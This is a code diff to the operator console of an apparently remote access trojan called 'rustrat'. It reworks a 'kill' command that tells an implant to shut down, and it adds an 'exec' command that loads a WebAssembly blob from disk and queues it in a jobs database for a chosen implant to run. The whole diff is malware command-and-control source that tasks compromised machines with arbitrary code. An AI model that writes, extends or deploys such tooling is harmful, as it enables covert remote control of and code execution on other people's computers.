@@ -1,5 +1,7 @@
 use crate::badtui::gui::Command;
 
+use rustrat_common::messages::*;
+
 use futures::StreamExt;
 
 pub struct Input {
@@ -95,33 +97,70 @@ impl Input {
                 gui_tx.send(Command::Quit).await.unwrap();
             }
 
-            "kill" => {
-                if cmd_parts.len() != 2 {
-                    log::info!("Usage: kill <rat id>");
-                } else {
-                    match cmd_parts[1].parse::<i32>() {
-                        Ok(rat_id) => {
-                            let db_pool = self.db_pool.clone();
-                            tokio::spawn(async move {
-                                let result = sqlx::query!(
-                                    "INSERT INTO jobs (rat_id, created, last_update, started, done, job_type, payload) VALUES (?, datetime('now'), datetime('now'), false, false, 'exit', '');",
-                                    rat_id
-                                )
-                                    .execute(&db_pool.writer)
-                                    .await;
+            "kill" if cmd_parts.len() != 2 => log::info!("Usage: kill <rat id>"),
+            "kill" if cmd_parts.len() == 2 => match cmd_parts[1].parse::<i32>() {
+                Ok(rat_id) => {
+                    let db_pool = self.db_pool.clone();
+                    tokio::spawn(async move {
+                        let result = sqlx::query!(
+                                "INSERT INTO jobs (rat_id, created, last_update, started, done, job_type, payload) VALUES (?, datetime('now'), datetime('now'), false, false, 'exit', '');",
+                                rat_id
+                            )
+                                .execute(&db_pool.writer)
+                                .await;
 
-                                if result.is_ok() {
-                                    log::info!("Tasked rat #{} to shut down", rat_id);
-                                } else {
-                                    log::info!("Unable to make rat #{} shut down, are you sure you entered the correct id?", rat_id);
+                        if result.is_ok() {
+                            log::info!("Tasked rat #{} to shut down", rat_id);
+                        } else {
+                            log::info!("Unable to make rat #{} shut down, are you sure you entered the correct id?", rat_id);
+                        }
+                    });
+                }
+
+                Err(_) => log::info!("Unable to parse rat id \"{}\" as an int", cmd_parts[1]),
+            },
+
+            "exec" if cmd_parts.len() != 4 => {
+                log::info!("Usage: exec <rat id> <path to wasm blob> <fn name>");
+                log::info!("Note that spaces in the path is not supported at the moment");
+            }
+
+            "exec" if cmd_parts.len() == 4 => {
+                match cmd_parts[1].parse::<i32>() {
+                    Ok(rat_id) => {
+                        let db_pool = self.db_pool.clone();
+
+                        tokio::spawn(async move {
+                            match tokio::fs::read(&cmd_parts[2]).await {
+                                Ok(wasm) => {
+                                    // This should probably be handled gracefully, but when will serialization fail?
+                                    let payload =
+                                        serialize(&server_to_rat::Task::WebAssemblyTask {
+                                            wasm,
+                                            fn_name: cmd_parts[3].to_string(),
+                                        })
+                                        .unwrap();
+                                    let result = sqlx::query!(
+                                        "INSERT INTO jobs (rat_id, created, last_update, started, done, job_type, payload) VALUES (?, datetime('now'), datetime('now'), false, false, 'task', ?)",
+                                        rat_id,
+                                        payload
+                                    ).execute(&db_pool.writer).await;
+
+                                    if result.is_ok() {
+                                        log::info!("Tasked rat {} to execute function {} from {}", rat_id, cmd_parts[3], cmd_parts[2]);
+                                    } else {
+                                        log::info!("Unable to store job in database, are you sure you entered the correct id?");
+                                    }
                                 }
-                            });
-                        }
 
-                        Err(_) => {
-                            log::info!("Unable to parse rat id \"{}\" as an int", cmd_parts[1])
-                        }
+                                Err(_) => {
+                                    log::info!("Unable to read WASM blob from {}", cmd_parts[2])
+                                }
+                            }
+                        });
                     }
+
+                    Err(_) => log::info!("Unable to parse rat id \"{}\" as an int", cmd_parts[1]),
                 }
             }
 
